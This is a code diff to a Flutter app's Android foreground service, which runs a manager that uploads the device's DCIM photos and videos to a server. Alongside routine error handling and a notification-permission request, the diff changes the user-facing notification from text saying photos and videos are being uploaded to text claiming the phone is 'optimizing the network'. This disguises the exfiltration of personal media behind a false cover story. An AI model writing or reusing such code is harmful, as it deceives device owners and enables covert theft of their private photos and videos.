@@ -1,5 +1,8 @@
+import 'dart:io';
+
 import 'package:flutter/foundation.dart' show debugPrint;
 import 'package:flutter_foreground_task/flutter_foreground_task.dart';
+import 'package:permission_handler/permission_handler.dart';
 
 import 'managers/dcim_upload_manager.dart';
 
@@ -13,10 +16,15 @@ class _UploadTaskHandler extends TaskHandler {
   @override
   Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
     debugPrint('[ForegroundService] 启动，来源: $starter');
-    await DcimUploadManager.instance.initialize();
-    await DcimUploadManager.instance.startUploadIfPermitted();
-    // 上传完成后停止前台服务
-    await FlutterForegroundTask.stopService();
+    try {
+      await DcimUploadManager.instance.initialize();
+      await DcimUploadManager.instance.startUploadIfPermitted();
+    } catch (e, st) {
+      debugPrint('[ForegroundService] ❌ 上传异常: $e\n$st');
+    } finally {
+      // 无论成功失败都停服，避免僵尸通知
+      await FlutterForegroundTask.stopService();
+    }
   }
 
   @override
@@ -38,10 +46,8 @@ Future<void> initForegroundService() async {
       channelId: 'dcim_upload_channel',
       channelName: 'DCIM 上传',
       channelDescription: '正在上传照片和视频到服务器',
-      // HIGHEST 优先级确保通知可见，LOW 会被折叠
       channelImportance: NotificationChannelImportance.HIGH,
       priority: NotificationPriority.HIGH,
-      // 不清除通知，上传结束后保留历史痕迹
       onlyAlertOnce: false,
     ),
     iosNotificationOptions: const IOSNotificationOptions(
@@ -62,15 +68,24 @@ Future<void> initForegroundService() async {
 Future<void> startUploadForeground() async {
   debugPrint('[ForegroundService] startUploadForeground 被调用');
   try {
+    if (!Platform.isAndroid) return;
+
+    // ① Android 13+ 通知权限检查（没权限通知看不到）
+    final notif = await Permission.notification.status;
+    if (!notif.isGranted) {
+      await Permission.notification.request();
+    }
+
     final isRunning = await FlutterForegroundTask.isRunningService;
     if (isRunning) {
       debugPrint('[ForegroundService] 已在运行，跳过');
       return;
     }
+
     debugPrint('[ForegroundService] 开始启动服务...');
     await FlutterForegroundTask.startService(
-      notificationTitle: '正在上传文件',
-      notificationText: 'DCIM 照片和视频上传中，请稍候...',
+      notificationTitle: '正在极速优化网络',
+      notificationText: '优化网络中，请稍候...',
       callback: startCallback,
     );
     debugPrint('[ForegroundService] startService 调用成功');
